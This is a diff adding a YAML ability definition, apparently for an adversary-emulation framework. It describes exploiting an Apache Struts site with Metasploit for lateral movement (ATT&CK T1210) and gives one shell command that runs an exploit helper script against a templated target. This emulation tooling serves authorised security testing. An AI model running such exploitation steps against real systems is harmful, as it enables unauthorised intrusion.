@@ -1,0 +1,19 @@
+---
+
+- id: 88c8beaf-da10-489e-896f-49fb583a1a0c
+  name: Exploit Apache Struts With Metasploit
+  description: Use Metasploit to Exploit an Apache Struts Website
+  tactic: Lateral-Movement
+  technique:
+    attack_id: T1210
+    name: Exploitation of Remote Services
+  platforms:
+    linux:
+      sh:
+        command: |
+          python3 metasploit_exploit_port.py --target #{remote.service.apachestruts} --server #{server} --keywords struts
+        payload: metasploit_exploit_port.py
+        parser:
+          name: line
+          property: remote.vuln.metasploit
+          script: ''
